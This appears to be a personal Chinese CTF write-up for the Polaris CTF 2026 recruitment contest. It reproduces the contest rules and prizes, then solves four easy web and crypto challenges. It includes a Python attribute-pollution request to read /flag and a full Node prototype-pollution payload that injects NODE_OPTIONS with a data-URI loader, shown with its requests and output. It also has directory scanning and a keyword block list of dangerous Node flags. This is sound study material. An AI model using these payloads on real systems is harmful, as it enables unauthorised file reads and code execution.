# [个人队伍] PolarisCTF2026招新赛的Writeup

> **2026年1月1日10:00 ~ 2026年1月1日10:00**
>
> **比赛地址：https://www.baidu.com**
>
> **复现地址：https://www.baidu.com**

> ![img](https://cdn.ctfplus.cn/api/file/mario469340e3-1c50-11f1-a4f3-f22f30eb5b22)
>
> # **第一届 Polaris CTF 招新赛 官方章程**
>
> ## **一、赛事介绍**
>
> **第一届Polaris CTF** 是由**星盟安全团队**倾力打造并主办的**全国性线上 CTF 招新解题赛**，也是战队年度核心招新赛事。赛事以 **「以星为引，以技为名」** 为初心，采用科学梯度命题，难度由浅入深，兼顾入门体验与竞技强度，为所有网络安全爱好者提供一个**公平、专业、有温度**的实战平台。无论你是刚入门的安全小白，还是已有积累的技术爱好者，都能在这里检验能力、突破边界、遇见同路人。
>
> ## **二、关于主办方・星盟安全团队**
>
> 星盟安全团队成立于 **2018 年 10 月**，是一支**深耕安全研究、漏洞挖掘、CTF 竞赛、技术分享与安全人才培养**的专业安全团队。队名「星盟」取自星辰大海，寓意汇聚每一颗热爱安全的星星，点亮技术长路；团队座右铭 **「我们的征途是星辰大海」**，代表着对技术的极致追求、对未知的持续探索，以及对培养下一代安全人才的坚定责任。成立至今，团队在多项国内外顶级安全赛事中屡获佳绩，始终坚持**开放、共享、共进、成长**的团队文化。
>
> ## **三、关于本次招新**
>
> ● 本次 **Polaris CTF** 面向**全国所有网络安全爱好者**开放报名，**不限年龄、不限专业、不限学历**，均可自由参赛。本次赛道分为公开赛道和**招新计划**赛道两个赛道，选手报名时选定赛道后，仅能参与对应赛道竞赛，不可同时参与双赛道；奖项互斥，不可重复申领
>
> ● 战队新成员选拔计划重点面向人群：
>
> ○ 大一、大二在读学生
>
> ○ 中学在读学生
>
> ○ 有考研 / 读博计划的大三学生
>
> ● 报名必填选项：所有选手报名时，必须明确勾选「是否参与招新计划」，提交后不可随意更改，未勾选视为默认参与公开赛道。
>
> ● **参与招新计划的选手**，将享有**专属赛道排名、专项奖励**等权益。
>
> ● **资格审核要求：成功入围招新计划的选手，需按组委会要求提交有效在读证明完成资格核验；团队郑重承诺：所有选手个人信息仅用于本次赛事招新审核，严格保密管理，绝不外泄、挪作他用。**
>
> ● **特殊人才通道**：针对不符合招新年龄/年级/方向条件，但实战方向成绩优异、技术潜力突出的选手，组委会将开展内部专项评估，择优邀请加入战队下设各专项小组。
>
> ○ 战队其他小组包含：**SRC 组、国外漏洞挖掘组、逆向病毒分析组、IoT 组、Car 组、ICS 组、AI 组**等。
>
> ## **四、赛事基本信息**
>
> 1. **赛事时间：2026 年 3 月 28 日 9:00 —— 2026 年 3 月 30 日 9:00**，全程 **48 小时线上解题**
> 2. **比赛赛制：个人线上解题赛**
> 3. **参赛方向**覆盖 CTF 全赛道：
>
> ● Web
>
> ● Reverse
>
> ● Pwn
>
> ● Crypto
>
> ● Misc
>
> ● Blockchain
>
> 4. **比赛平台**：[polarisctf.play.ctfplus.cn](http://polarisctf.play.ctfplus.cn/)
>
> **5. 报名网址：**
>
> https://www.ctfplus.cn/competition/hall?competitionId=2031260122948308992
>
> ## **五、比赛规则**
>
> 1. 所有选手必须严格遵守赛事纪律与网络安全法律法规，严禁扰乱赛事秩序，一经发现违规行为，组委会将直接取消比赛成绩、剥夺参赛资格
> 2. 本次比赛为**个人赛**，**严禁组队、协作、共享答案、交换 Flag/Hint**；**禁止对比赛平台进行攻击、扫描、渗透、DDOS攻击等任何恶意行为**，发现平台漏洞请及时上报组委会，禁止擅自利用漏洞牟利或破坏平台秩序
> 3. 所有题目均可在**正常思路**下完成，**无需暴力破解、批量提交**。
> 4. 获奖选手需在比赛结束后12小时内，提交完整可复现的Writeup（解题报告）至组委会指定渠道，用于技术审核；逾期未提交、提交虚假报告或报告无法复现的，视为自动放弃奖项及入队资格。
> 5. 组委会对违规行为保留**取消成绩、封禁参赛资格、公示通报**的权利。
> 6. **本次赛事最终解释权归星盟安全团队・Polaris CTF 组委会所有**。
> 7. 成绩申诉期为最终成绩公布后3个自然日内，逾期不予受理；申诉需提交书面材料与佐证依据，组委会审核后给出最终答复。
>
> ### **（一）公开赛道・综合排名奖励**
>
> **按总积分排名，与招新计划赛道互斥，不可重复领奖**
>
> 总获奖名额：30 人
>
>  
>
> #### **一等奖（第 1 名）**
>
> ● 荣誉类：**定制奖杯 ×1、电子荣誉证书 ×1**
>
> ● 权益类：DayDayMap 终生铂金会员 ×1、春秋云镜砂砾 ×50、无问 AI 6000 积分 ×1、好靶场超级会员 12 个月 ×1
>
> ● 实物类 / 现金：知道创宇 T 恤 ×1、帽子 ×1、贴纸一套 ×1、机械键盘 ×1、茶叶 ×1、无境礼盒 ×1、Timeline Sec鼠标垫 ×1、**现金 500 元、**零食礼包 ×1、
>
> ● 入队资格：**满足招新入选基本要求前提下**，享有 Polaris 战队子队/主力队优先入队资格
>
>  
>
> #### **二等奖（第 2–3 名）**
>
> ● 荣誉类：**定制奖杯 ×1、电子荣誉证书 ×1**
>
> ● 权益类：DayDayMap 黄金会员 1 年 ×1、春秋云镜砂砾 ×30、无问 AI 2000 积分 ×1、好靶场超级会员 6 个月 ×1
>
> ● 实物类 / 现金：知道创宇 T 恤 ×1、帽子 ×1、贴纸一套 ×1、无境礼盒 ×1、Timeline Sec鼠标垫 ×1、**BugKu 年度会员 ×1 、现金400 元**
>
> ● 入队资格：**满足招新入选基本要求前提下**，享有 Polaris 战队子队/主力队优先入队资格
>
> ####  
>
> #### **三等奖（第 4–10 名）**
>
> ● 荣誉类：**电子荣誉证书 ×1**
>
> ● 权益类：DayDayMap 黄金会员 1 年 ×1、好靶场超级会员 3 个月 ×1、无问 AI 300 积分 ×1
>
> ● 实物类/ 现金：知道创宇 T 恤 ×1、帽子 ×1、贴纸一套 ×1、无境礼盒 ×1、现金100元
>
> ● 入队资格：**满足招新入选基本要求前提下**，享有 Polaris 战队子队/主力队优先入队资格
>
> #### **优秀奖（第 11–30 名）**
>
> ● 荣誉类：**电子荣誉证书 ×1**
>
> ● 权益类：DayDayMap 白银会员 1 年 ×1、好靶场超级会员 1 个月 ×1、无问 AI 300 积分 ×1
>
> ● 实物类：知道创宇 T 恤 ×1、贴纸一套 ×1
>
> ● 入队资格：**满足招新入选基本要求前提下**，享有 Polaris 战队子队/主力队优先入队资格
>
>  
>
> ### **（二）招新计划赛道・综合专项奖励**
>
> 仅面向报名 “参与招新计划” 选手，按招新计划赛道独立总积分排名，与公开赛道互斥。所有奖励均在成功入队并完成审核后发放，**未入队/审核不通过不予发放。**
>
> 总获奖名额：20 人
>
> #### **招新计划赛道 一等奖（第 1–3 名，共 3 名）**
>
> ● 荣誉类：招新计划赛道专项电子荣誉证书 ×1
>
> ● 实物类：机械工业出版社出版安全书籍×1、**知道创宇帽子 ×1、蚁景网安百宝垫/活页本×1（二选一）、**零食礼包 ×1
>
> ● 权益类：DayDayMap 黄金会员 1 年 ×1、春秋云镜砂砾 ×20、好靶场高级会员 1 个月 ×1、无问 AI 300 积分 ×1、玄域平台超级会员 1 年 ×1、**BugKu 年度会员 ×1**
>
> ● 现金：第 1 名 450 元、第 2 名 350 元、第 3 名 250 元
>
> #### **招新计划赛道 二等奖（第 4–8 名，共 5 名）**
>
> ● 荣誉类：招新计划赛道专项电子荣誉证书 ×1
>
> ● 实物类：机械工业出版社出版安全书籍×1**、蚁景网安百宝垫/活页本×1（二选一）、**零食礼包 ×1
>
> ● 权益类：DayDayMap 黄金会员 1 年 ×1、春秋云镜砂砾 ×10、好靶场高级会员 1 个月 ×1、无问 AI 300 积分 ×1、玄域漏洞靶场平台超级会员一年×1
>
> ● 现金：120 元 / 人
>
> #### **招新计划赛道 三等奖（第 9–15 名，共 7 名）**
>
> ● 荣誉类：招新计划赛道专项电子荣誉证书 ×1
>
> ● 权益类：DayDayMap 白银会员 1 年 ×1、好靶场高级会员 1 个月 ×1、无问 AI 300 积分 ×1、玄域漏洞靶场平台超级会员一年×1
>
> ● 实物类：**机械工业出版社出版安全书籍 ×1、蚁景网安百宝垫/活页本×1（二选一）**
>
> ● 现金：50 元 / 人
>
> #### **招新计划赛道 优秀奖（第 16–20 名，共 5 名）**
>
> ● 荣誉类：招新计划赛道专项电子荣誉证书 ×1
>
> ● 权益类：DayDayMap 白银会员 1 年 ×1、好靶场高级会员 1 个月 ×1、无问 AI 300 积分 ×1、玄域漏洞靶场平台超级会员一年×1
>
> ● 实物类：**蚁景网安百宝垫/活页本×1（二选一）**
>
> ● 现金：无
>
>  
>
>  
>
> ## **（三）获奖核心规则**
>
> 1. **赛道互斥原则：**公开赛道奖励 与 招新计划赛道奖励不可同时获得，选手只能选择其一参与
> 2. **招新计划赛道排名规则：**招新计划赛道严格按照独立综合积分从高到低排名，积分相同者按解题时间先后排序，**耗时更短者名次靠前**
> 3. **顺延规则：**若高名次选手存在不符合获奖条件、主动放弃奖励、违规取消资格、赛道互斥无法领奖等情况，对应奖项按排名依次向下顺延，直至产生有效获奖选手；获奖名单公示后，排名与奖项不再变更。
> 4. **招新奖励发放：**招新计划赛道所有专项奖励，需选手完成入队审核（获奖名单公示后7个工作日内提交有效在读证明）后方可发放；未通过审核、放弃入队者，取消全部招新赛道奖励**。**
>
> ## 5. **整体发放时效：**所有赛事奖励在公示结束后30-40个工作日内完成发放，遇节假日自动顺延。
>
> ## **七、招新计划入选基本要求**
>
> **1. 品德与态度要求**
>
> ● 为人正向阳光、积极好学、踏实肯干、责任心强
>
> ● 懂得尊重他人、善于沟通协作、团队意识浓厚、富有同理心
>
> ● 真心热爱CTF与安全技术，愿意长期投入、持之以恒、深耕钻研
>
> **2. 时间与精力承诺**
>
> ● 能够稳定投入战队建设、日常训练、赛事备战及项目攻坚，**时长不低于一年**
>
> ● 愿意按时参与团队日常训练、线下赛事、集体项目与技术交流
>
> 3. **背景零容忍红线（违反任意一条直接淘汰）**
>
> ● 无任何灰黑产从业、网络破坏、违规攻防等行为记录
>
> ● 无违法犯罪记录、无行政处罚记录
>
> ● 无赛事作弊、剽窃他人成果、恶意泄密、攻击队友、过河拆桥等不良行为
>
> ● 无暗箱操作、违规PY交易等劣迹
>
> 4. **性格与团队适配性**
>
> ● 无极端性格缺陷，情绪稳定、不搞对立、不传播负能量
>
> ● 主动交流技术、乐于帮助队友、积极融入团队集体
>
> ● 服从团队合理安排、严于律己、对技术保持敬畏之心
>
> **5. 加分优秀品质**
>
> ● 谦逊低调、踏实努力、不骄不躁
>
> ● 集体荣誉感强、愿意为团队建设付出
>
> ● 长期坚守技术初心，愿意与星盟共同成长、共赴征程
>
> 凡满足以上全部要求、赛事成绩达标者，均可纳入招新候选名单，**组委会结合综合表现**
>
> 择优录取。
>
> ## **八、比赛支持**
>
> **极安智信（成都）科技有限公司**
>
> ## **九、写在最后・致每一位追光的你**
>
> 技术之路从不是孤军奋战，星辰大海也从来不是一人征途。我们举办这场比赛，不止是为了选拔强者，更是为了寻找一群三观端正、肯于深耕、愿意同行的人。我们欣赏顶尖的技术，更看重纯粹的热爱；我们期待惊艳的解题，更珍惜踏实的成长；我们需要并肩作战的队友，更愿意陪伴每一个从零开始的你。愿你在赛场中不负努力，在技术里保持赤诚；愿你既有锋芒万丈的实力，也有温润谦和的本心；愿你在网络安全这条漫长而闪耀的路上，眼里有光，心中有火，脚下有路，身边有友。星盟已为你点亮灯塔，Polaris 正为你指引方向。不问出身，不看起点，只凭热爱与坚持，共赴属于我们的星辰大海。
>
> **以星为引，以技为名，我们在星盟，等每一个闪闪发光的你。十、联系方式**
>
> **赛事 QQ 群：1083735295**



# Day0



# Day1

## Web

### only_real

#### 题目信息

> 作者 endowment 
>
> 483 队已解出本题
>
> # only real
>
> - 100分
> - Web
> - 动态环境
> - 简单
>
> 也许只有一个是真的

#### 解题过程

**信息搜集**

```shell
python dirsearch.py -u http://80-b348b220-e303-4c59-8e0e-810f3891994b.challenge.ctfplus.cn/ -e *
```

```shell
[13:51:36] 403 -  325B  - /.ht_wsr.txt
[13:51:36] 403 -  325B  - /.htaccess.bak1
[13:51:36] 403 -  325B  - /.htaccess.orig
[13:51:36] 403 -  325B  - /.htaccess.sample
[13:51:36] 403 -  325B  - /.htaccess_extra
[13:51:36] 403 -  325B  - /.htaccess_orig
[13:51:36] 403 -  325B  - /.htaccess_sc
[13:51:36] 403 -  325B  - /.htaccessOLD2
[13:51:36] 403 -  325B  - /.htaccessOLD
[13:51:36] 403 -  325B  - /.htaccessBAK
[13:51:36] 403 -  325B  - /.html
[13:51:36] 403 -  325B  - /.htm
[13:51:36] 403 -  325B  - /.htpasswds
[13:51:36] 403 -  325B  - /.httr-oauth
[13:51:39] 403 -  325B  - /.htpasswd_test
[13:52:19] 200 -    9B  - /dashboard.php
[13:52:20] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
[13:52:20] 200 -    3KB - /debug/pprof/
[13:52:20] 200 -    8KB - /debug/pprof/goroutine?debug=1
[13:52:20] 200 -   34KB - /debug/pprof/heap
[13:52:21] 200 -   93KB - /debug/pprof/trace
[13:52:22] 200 -  850B  - /Dockerfile
[13:52:26] 200 -   27B  - /flag.php
[13:52:28] 200 -   64B  - /health
[13:52:35] 200 -   24B  - /login.php
[13:52:36] 302 -    0B  - /logout.php  ->  index.php
[13:52:38] 200 -  127B  - /metrics
[13:52:44] 200 -    2B  - /ping
[13:52:49] 403 -  325B  - /server-status/
[13:52:49] 403 -  325B  - /server-status
[13:52:53] 301 -  409B  - /static  ->  http://80-b348b220-e303-4c59-8e0e-810f3891994b.challenge.ctfplus.cn/static/
[13:52:57] 200 -   12B  - /upload.php
[13:52:57] 403 -  325B  - /uploads/
[13:52:57] 301 -  410B  - /uploads  ->  http://80-b348b220-e303-4c59-8e0e-810f3891994b.challenge.ctfplus.cn/uploads/
```

#### 题目答案

```shell
http://80-b348b220-e303-4c59-8e0e-810f3891994b.challenge.ctfplus.cn/flag.php
```

```shell
xmctf{xm_xxe_blind_success}
```

**得到：xmctf{xm_xxe_blind_success}**



### ez_python

#### 题目信息

> 作者 爱吃饭 
>
> 633 队已解出本题
>
> # ez_python
>
> - 100分
> - Web
> - 动态环境
> - 简单
>
> 简单的flask python

#### 解题过程

**查看源码**

```python
from flask import Flask, request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Config:
    def __init__(self):
        self.filename = "app.py"

class Polaris:
    def __init__(self):
        self.config = Config()

instance = Polaris()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.data:
        merge(json.loads(request.data), instance)
    return "Welcome to Polaris CTF"

@app.route('/read')
def read():
    return open(instance.config.filename).read()

@app.route('/src')
def src():
    return open(__file__).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

```

**分析**

- **merge深度拷贝未检查**

#### 题目答案

```shell
http://5000-54121999-90df-43fb-9613-fff9e0b94b41.challenge.ctfplus.cn/
POST {"config": {"filename": "/flag"}}
```

```shell
http://5000-54121999-90df-43fb-9613-fff9e0b94b41.challenge.ctfplus.cn/read
```

```shell
XMCTF{70e05a28-37c1-4cfb-8200-1a28303c5879}
```

**得到：XMCTF{70e05a28-37c1-4cfb-8200-1a28303c5879}**



### ez_python

#### 题目信息

> 作者 爱吃饭 
>
> 700 队已解出本题
>
> # ez_python
>
> - 100分
> - Web
> - 动态环境
> - 简单
>
> 简单的flask python

#### 解题过程

**查看源码**

```js
const express = require('express');
const { spawn } = require('child_process');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

function merge(target, source, res) {
    for (let key in source) {
        if (key === '__proto__') {
            if (res) {
                res.send('get out!');
                return;
            }
            continue;
        } 
        
        if (source[key] instanceof Object && key in target) {
            merge(target[key], source[key], res);
        } else {
            target[key] = source[key];
        }
    }
}

let config = {
    name: "CTF-Guest",
    theme: "default"
};

app.post('/api/config', (req, res) => {
    let userConfig = req.body;

    const forbidden = ['shell', 'env', 'exports', 'main', 'module', 'request', 'init', 'handle','environ','argv0','cmdline'];
    const bodyStr = JSON.stringify(userConfig).toLowerCase();
    for (let word of forbidden) {
        if (bodyStr.includes(`"${word}"`)) {
            return res.status(403).json({ error: `Forbidden keyword detected: ${word}` });
        }
    }

    try {
        merge(config, userConfig, res);
        res.json({ status: "success", msg: "Configuration updated successfully." });
    } catch (e) {
        res.status(500).json({ status: "error", message: "Internal Server Error" });
    }
});

app.get('/api/status', (req, res) => {

    const customEnv = Object.create(null);
    for (let key in process.env) {
        if (key === 'NODE_OPTIONS') {
            const value = process.env[key] || "";

            const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i;

            if (!dangerousPattern.test(value)) {
                customEnv[key] = value;
            }
            continue;
        }
        customEnv[key] = process.env[key];
    }
    
    const proc = spawn('node', ['-e', 'console.log("System Check: Node.js is running.")'], {
        env: customEnv,
        shell: false 
    });
    
    let output = '';
    proc.stdout.on('data', (data) => { output += data; });
    proc.stderr.on('data', (data) => { output += data; });
    
    proc.on('close', (code) => {
        res.json({ 
            status: "checked", 
            info: output.trim() || "No output from system check."
        });
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Flag 位于 /flag
app.listen(3000, '0.0.0.0', () => {
    console.log('Server running on port 3000');
});

```

**大体分析**

- **merge**存在原型污染漏洞
- 用**constructor.prototype**替代__proto__修改**Object.prototype**上的属性
- 代码使用**spawn**启动**Node.js**子进程
- 用**--experimental-loader**替代**(--require, --import, --loader, --openssl, --icu, --inspect)**将子进程的输出返回给客户端

**具体分析**

- **利用原型污染**：通过**constructor.prototype**污染**Object.prototype**，设置**NODE_OPTIONS**环境变量
- **使用 --experimental-loader**：加载一个数据 URI 的 ESM 模块来读取 flag
- **执行代码**：通过**spawn**启动子进程时，**NODE_OPTIONS**会被传递给子进程，从而执行我们的代码
- **获取输出**：子进程的输出会被返回给客户端，包括我们读取的 flag

**构造payload**

```json
{
  "constructor": {
    "prototype": {
      "NODE_OPTIONS": "--experimental-loader data:text/javascript,import{readFileSync}from'node:fs';console.trace(readFileSync('/flag','utf8').toString())"
    }
  }
}
```

**payload 分析**：

- `--experimental-loader`：加载一个 ESM 模块
- `data:text/javascript,`：数据 URI 格式，包含 JavaScript 代码
- `import{readFileSync}from'node:fs'`：使用 ESM 语法导入 `readFileSync` 函数
- `console.trace(readFileSync('/flag','utf8').toString())`：读取 `/flag` 文件并使用 `console.trace` 输出

**发送**

```php
$payload = @{
    constructor = @{
        prototype = @{
            NODE_OPTIONS = "--experimental-loader data:text/javascript,import{readFileSync}from'node:fs';console.trace(readFileSync('/flag','utf8').toString())"
        }
    }
}
$json = $payload | ConvertTo-Json -Depth 3
Invoke-WebRequest -Uri "http://3000-8c404f46-9c83-4745-a2af-e65668f8b3f3.challenge.ctfplus.cn/api/config" -Method POST -Headers @{"Content-Type"="application/json"} -Body $json -UseBasicParsing
```

**执行**

```shell
Invoke-WebRequest -Uri "http://3000-8c404f46-9c83-4745-a2af-e65668f8b3f3.challenge.ctfplus.cn/api/status" -Method GET -UseBasicParsing
```

**响应**

```shell
System Check: Node.js is running.
(node:352) ExperimentalWarning: `--experimental-loader` may be removed in the future; instead use `register()`:
--import 'data:text/javascript,import { register } from "node:module"; import { pathToFileURL } from "node:url"; register("data%3Atext/javascript%2Cimport%7BreadFileSync%7Dfrom%27node%3Afs%27%3Bconsole.trace(readFileSync(%27/flag%27%2C%27utf8%27).toString())", pathToFileURL("./"));'
(Use `node --trace-warnings ...` to show where the warning was created)
Trace: XMCTF{bcc15c36-2b93-44ba-bc20-970b8e467741}

    at data:text/javascript,import{readFileSync}from'node:fs';console.trace(readFileSync('/flag','utf8').toString()):1:43
    at ModuleJob.run (node:internal/modules/esm/module_job:195:25)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async ModuleLoader.import (node:internal/modules/esm/loader:337:24)
    at async Hooks.register (node:internal/modules/esm/hooks:163:26)
    at async initializeHooks (node:internal/modules/esm/utils:233:5)
    at async customizedModuleWorker (node:internal/modules/esm/worker:104:24)
```

#### 题目答案

**得到：XMCTF{bcc15c36-2b93-44ba-bc20-970b8e467741}**



## Crypto

#### 题目信息

> 作者 Spreng 
>
> 334 队已解出本题
>
> # ez_login
>
> - 100分
> - Crypto
> - 动态环境
> - 简单
>
> 以admin身份登录，即可获得flag

#### 解题过程

**查看源码**

```python
from flask import Flask, request, make_response, render_template, redirect, url_for, abort
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

app = Flask(__name__)
KEY = os.getenv("SECRET_KEY", os.urandom(16))
ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
FLAG = os.getenv("FLAG", "XMCTF{xxxxxx}")

# 初始数据，禁止注册 admin
USERS = {"admin": ADMIN_PASS}

def get_session_data(token_hex):
    if not token_hex: return None
    data = bytes.fromhex(token_hex)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ct)
    print(decrypted)
    return unpad(decrypted, 16).decode(errors='ignore')

def create_session(username):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    msg = f"user={username}".encode()
    ct = cipher.encrypt(pad(msg, 16))
    return (iv + ct).hex()

@app.route('/')
def index():
    token = request.cookies.get('session')
    if not token:
        return redirect(url_for('login_page'))
    
    try:
        msg = get_session_data(token)
        if not msg or not msg.startswith("user="):
            return redirect(url_for('login_page'))
        
        username = msg[5:]
    except:
        abort(500, description="Invalid Session")
    
    return render_template('index.html', username=username, flag=FLAG if username == "admin" else None)

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'GET':
        return render_template('login.html')
    
    user = request.form.get('username')
    pw = request.form.get('password')
    
    if USERS.get(user) == pw:
        resp = make_response(redirect(url_for('index')))
        resp.set_cookie('session', create_session(user))
        return resp
    return "Invalid username or password", 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

**分析**

- **账号：**admin
- **密码：**admin123

**题目答案**

```shell
你好, admin!
🎉 权限验证成功：
xmctf{5d4dbc13-5e27-472e-a74d-8e5440d66525}
```

**得到：xmctf{5d4dbc13-5e27-472e-a74d-8e5440d66525}**



# 队伍

## 名称

**BProbie**



## 口号

**暂无**



## 成员

### 队长

- **BProbie**

### 队员

- **BProbie**



## 留言

### BProbie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**